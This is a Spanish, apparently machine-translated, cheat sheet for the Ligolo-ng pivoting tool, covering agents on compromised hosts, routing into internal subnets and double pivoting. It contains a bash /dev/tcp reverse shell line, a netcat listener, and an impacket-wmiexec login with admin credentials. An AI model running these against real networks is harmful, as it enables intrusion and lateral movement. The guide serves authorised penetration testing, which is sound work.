<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔀 Ligolo-ng - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
  ██╗     ██╗ ██████╗  ██████╗ ██╗      ██████╗      ███╗   ██╗ ██████╗ 
  ██║     ██║██╔════╝ ██╔═══██╗██║     ██╔═══██╗     ████╗  ██║██╔════╝ 
  ██║     ██║██║  ███╗██║   ██║██║     ██║   ██║     ██╔██╗ ██║██║  ███╗
  ██║     ██║██║   ██║██║   ██║██║     ██║   ██║     ██║╚██╗██║██║   ██║
  ███████╗██║╚██████╔╝╚██████╔╝███████╗╚██████╔╝     ██║ ╚████║╚██████╔╝
  ╚══════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝      ╚═╝  ╚═══╝ ╚═════╝ 
                 Advanced TUN-based Pivoting Tool
```
<p align="centro">
  <img src="https://img.shields.io/badge/Ligolo--ng-Pivoting-blue?style=for-the-badge" alt="Ligolo-ng">
  <img src="https://img.shields.io/badge/TUN_Interface-VPN_Style-green?style=for-the-badge" alt="Interfaz TUN">
  <img src="https://img.shields.io/badge/Go-Cross_Platform-orange?style=for-the-badge" alt="Ir">
  <img src="https://img.shields.io/badge/Network_Pivoting-red?style=for-the-badge" alt="Pivotación de red">
</p>

<p align="centro">
  <b>🌐 Herramienta pivotante moderna, sencilla y de alto rendimiento que utiliza interfaces TUN en lugar de proxies SOCKS</b>
</p>

---

## 📋 Tabla de contenidos

- [Introducción](#-introducción)
- [¿Por qué Ligolo-ng? (Ligolo-ng frente a SOCKS/Proxychains)](#-why-ligolo-ng)
- [Arquitectura y cómo funciona](#-arquitectura--cómo-funciona)
- [Instalación](#-instalación)
- [Guía de inicio rápido](#-quick-start-guide)
  - [Paso 1: Configurar la interfaz TUN en el atacante](#paso-1-configurar-la-interfaz-tun-en-el-atacante)
  - [Paso 2: Iniciar el proxy Ligolo-ng](#paso-2-iniciar-el-proxy-ligolo-ng)
  - [Paso 3: Implementar el agente en Pivot Target](#paso-3-implementar-el-agente-en-pivot-target)
  - [Paso 4: Configurar el enrutamiento del atacante](#paso-4-configurar-el-enrutamiento-del-atacante)
  - [Paso 5: Iniciar la sesión del túnel](#paso-5-iniciar-la-sesión-del-túnel)
- [Reenvío de puerto inverso (oyentes)](#-reenvío-de-puerto-inverso-oyentes)
- [Pivotación doble (Pivotación de varios niveles)](#-pivotación-doble-pivotación-multi-nivel)
- [Referencia de comandos interactivos de proxy](#-referencia-de-comandos-interactivos-proxy)
- [Opciones de línea de comando del agente](#-opciones-de-línea-de-comando-del-agente)
- [Solución de problemas y mejores prácticas](#-solución de problemas--mejores-prácticas)
- [Aviso legal](#-aviso-legal)
- [Recursos](#-recursos)

---

## 🎯 Introducción

**Ligolo-ng** es una herramienta de pivotación y tunelización avanzada, liviana y rápida escrita en Go. A diferencia de los proxies SOCKS tradicionales (como el estándar Chisel o el reenvío dinámico SSH), Ligolo-ng establece una **interfaz TUN** virtual directamente en la máquina atacante.

Esto convierte su host pivot comprometido en una verdadera puerta de enlace tipo VPN: todas las herramientas de su máquina atacante (incluidos `nmap -sS`, `crackmapexec`, `evil-winrm`, `impacket` y navegadores) pueden acceder a las subredes internas directamente mediante la dirección IP sin prefijar comandos con `proxychains`.

---

## ⚖️ ¿Por qué Ligolo-ng?

| Característica | Ligolo-ng | Proxychains + CALCETINES | CALCETINES SSH (`-D`) |
|---------|-----------|---------------------|------------------|
| **Soporte de protocolo** | TCP y UDP completos | Sólo TCP (UDP deficiente) | Sólo TCP |
| **Escaneo SYN de Nmap (`-sS`)**| ✅ Sí (Nativo) | ❌ No (Requiere TCP `-sT`) | ❌ No |
| **Compatibilidad de herramientas** | 100% (pila de IP del kernel) | Inconsistente (LD_PRELOAD) | Inconsistente |
| **Velocidad y latencia** | ⭐⭐⭐⭐⭐ Muy Rápido | ⭐⭐⭐ Moderado | ⭐⭐⭐ Moderado |
| **Sin envoltorio de CALCETINES** | ✅ Sí | ❌ Requiere envoltorio | ❌ Requiere envoltorio |
| **Oyentes inversos** | ✅ Incorporado | ❌ Requiere herramienta separada | ❌ Limitado |

---

## 🏗️ Arquitectura y cómo funciona
```
+-------------------+                          +---------------------+                          +----------------------+
|  Attacker Machine |                          | Pivot Target (Host) |                          | Internal Subnet Host |
| (192.168.1.100)   |                          | (Dual-homed)        |                          | (172.16.1.50)        |
|                   |                          |                     |                          |                      |
| [proxy server]    | <=== TLS Tunnel =======> | [ligolo agent]      |                          |                      |
|    ^              |      (Port 11601)        |    |                |                          |                      |
|    |              |                          |    |                |                          |                      |
| [tun0 interface]  |                          |    +--------------->| == Internal Traffic ===> | [Target Service]     |
| (172.16.1.0/24)   |                          |     (172.16.1.10)   |                          | (Port 445, 80, etc.) |
+-------------------+                          +---------------------+                          +----------------------+
```
1. **Proxy:** Se ejecuta en su máquina atacante, administra sesiones y une paquetes entre su interfaz TUN virtual y los agentes conectados.
2. **Agente:** Un binario liviano ejecutado en la máquina interna comprometida (Linux, Windows, macOS o ARM).
3. **Interfaz TUN:** Una interfaz de red de bucle invertido de software creada en Linux que enruta el tráfico destinado a subredes internas directamente a Ligolo.

---

## 📥 Instalación

Descargue los archivos binarios de la versión más reciente para **proxy** y **agent** desde la página oficial de versiones de GitHub:
```bash
# Download latest proxy for Linux
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-proxy/

# Download agents for various targets
# Linux Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-agents/linux/

# Windows Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip
unzip ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip -d /opt/ligolo-agents/windows/
```
---

## 🚀 Guía de inicio rápido

### Paso 1: Configurar la interfaz TUN en el atacante

Antes de ejecutar el proxy, cree un dispositivo TUN persistente en su máquina atacante Linux:
```bash
# Create a TUN interface named "ligolo"
sudo ip tuntap add user $USER mode tun ligolo

# Bring the interface UP
sudo ip link set ligolo up

# Verify interface state
ip link show ligolo
```
### Paso 2: Inicie el proxy Ligolo-ng

Ejecute el proxy utilizando certificados TLS autofirmados:
```bash
cd /opt/ligolo-proxy/
./proxy -self-cert -laddr 0.0.0.0:11601
```
> **Consejo:** También puede proporcionar certificados Let's Encrypt válidos utilizando `-certfile` y `-keyfile` para mantener la discreción en las interacciones del Red Team.

### Paso 3: Implementar el agente en Pivot Target

Transfiera el agente a su host comprometido y ejecútelo:

#### En el destino Linux:
```bash
chmod +x agent
./agent -connect 192.168.1.100:11601 -ignore-cert
```
#### En destino de Windows:
```powershell
.\agent.exe -connect 192.168.1.100:11601 -ignore-cert
```
### Paso 4: Configurar el enrutamiento del atacante

Una vez que el agente se conecta, inspeccione sus interfaces de red desde la consola proxy para determinar las subredes internas del objetivo (por ejemplo, `172.16.1.0/24`).

En tu **terminal atacante** (ventana separada), agrega una ruta que apunte a la interfaz TUN:
```bash
# Route internal subnet through ligolo TUN device
sudo ip route add 172.16.1.0/24 dev ligolo

# Check route table
ip route show | grep ligolo
```
### Paso 5: Iniciar la sesión del túnel

En el mensaje de proxy interactivo Ligolo-ng:
```text
ligolo-ng » session
? Select a session: 1 - user@PIVOT-HOST - 192.168.1.50:52418
[Agent : user@PIVOT-HOST] » start
[Agent : user@PIVOT-HOST] » INFO[0025] Tunnel started
```
¡Ahora tiene acceso IP nativo directo a la red interna! Pruébalo:
```bash
# Ping internal host
ping -c 3 172.16.1.50

# Native Nmap SYN scan without proxychains!
nmap -sS -Pn -T4 -p 80,445,3389 172.16.1.50

# Run Impacket directly
impacket-wmiexec DOMAIN/admin:Password@172.16.1.50
```
---

## 🔄 Reenvío de puerto inverso (oyentes)

¿Quiere recibir un shell inverso o detectar una retransmisión de autenticación NTLM en su cuadro de atacante desde un host interno que no puede enrutarse de regreso a su IP de atacante? ¡Usa **oyentes**!

Cuando configura un oyente en Ligolo-ng, el agente abre un puerto de escucha en la **máquina pivote** y retransmite el tráfico entrante a su máquina atacante.

### Ejemplo: atrapar un caparazón inverso

Dentro de la sesión de proxy:
```text
[Agent : user@PIVOT-HOST] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
INFO[0035] Listener created on 0.0.0.0:4444
```
En tu **máquina atacante**:
```bash
nc -lvnp 4444
```
En un **objetivo interno** (`172.16.1.75`):
```bash
# Send reverse shell to the pivot host's internal IP
bash -i >& /dev/tcp/172.16.1.10/4444 0>&1
```
¡El host pivote reenvía la conexión directamente a su oyente Netcat!

---

## ⛓️ Pivote doble (pivote de varios niveles)

Al acceder a redes profundamente anidadas (Subred A -> Subred B -> Subred C):

1. Establezca su túnel inicial hasta el Pivote 1 (`172.16.1.10`).
2. Descubra el pivote 2 ubicado en la subred B (`10.0.0.25`).
3. Configure un oyente en el pivote 1 para reenviar el tráfico desde la subred B a su puerto proxy `11601`:
   ```text
   [Agent : Pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
   ```
4. Implemente el agente Ligolo en el Pivot 2 y conéctese a la IP del Pivot 1:
   ```bash
   ./agent -connect 172.16.1.10:11601 -ignore-cert
   ```
5. ¡Aparecerá una segunda sesión en tu proxy! Agregue una ruta para la subred C:
   ```bash
   sudo ip route add 10.0.0.0/24 dev ligolo
   ```
6. Cambie a la sesión 2 y escriba `start`.

---

## ⌨️ Referencia de comandos interactivos de proxy

| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `session` | Listar y seleccionar sesiones activas de agentes conectados | `session` |
| `start` | Inicie el túnel de paquetes a través del agente activo | `start` |
| `stop` | Detener la sesión del túnel activo | `stop` |
| `ifconfig` | Mostrar interfaces de red del agente seleccionado | `ifconfig` |
| `listener_add` | Crear un puerto de escucha en el agente pivote | `listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443` |
| `listener_list`| Listar todos los oyentes activos del agente actual | `listener_list` |
| `listener_close`| Cerrar un oyente activo específico | `listener_close --id 0` |
| `help` | Mostrar ayuda del comando | `help` |
| `exit` | Finalizar proxy o volver al menú principal | `exit` |

---

## ⚙️ Opciones de línea de comandos del agente

| Bandera | Descripción | Ejemplo |
|------|-------------|---------|
| `-connect` | Dirección y puerto del proxy Ligolo | `-connect 192.168.1.100:11601` |
| `-ignore-cert` | Omitir la verificación del certificado TLS | `-ignore-cert` |
| `-retry` | Reintentar la conexión automáticamente si se desconecta | `-retry` |
| `-auto-clear` | Borrar salida del terminal tras la ejecución | `-auto-clear` |

---

## 💡 Solución de problemas y mejores prácticas

1. **Eliminar la interfaz TUN después de la participación:**
   Cuando termine con su prueba, limpie su tabla de enrutamiento y elimine la interfaz virtual:
   ```bash
   sudo ip link set ligolo down
   sudo ip tuntap del mode tun ligolo
   ```
2. **Compruebe dos veces las superposiciones de subredes IP:**
   Asegúrese de que la subred interna que está enrutando (por ejemplo, `192.168.1.0/24`) no colisione con la red de su atacante local. Si se superpone, utilice una ruta de host `/32` más específica (por ejemplo, `sudo ip route add 192.168.1.50/32 dev ligolo`).
3. **Consideraciones sobre el firewall en Pivot:**
   En objetivos Windows, asegúrese de que el Firewall de Windows Defender permita conexiones salientes en el puerto 11601 o en el puerto de escucha elegido.
4. **Utilice `-retry` en entornos reales:**
   Ejecute siempre agentes con `-retry` para restablecer automáticamente las conexiones después de caídas transitorias de la red.

---

## ⚠️ Aviso legal

> **IMPORTANTE:** Ligolo-ng es una poderosa utilidad de enrutamiento de red. Solo debe utilizarse durante pruebas de penetración autorizadas, compromisos del equipo rojo y evaluaciones de seguridad ética con el consentimiento explícito por escrito.

---

## 📚 Recursos

- [Repositorio oficial de Ligolo-ng GitHub] (https://github.com/nicocha30/ligolo-ng)
- [Documentación oficial de Ligolo-ng](https://github.com/nicocha30/ligolo-ng/blob/master/DOCUMENTATION.md)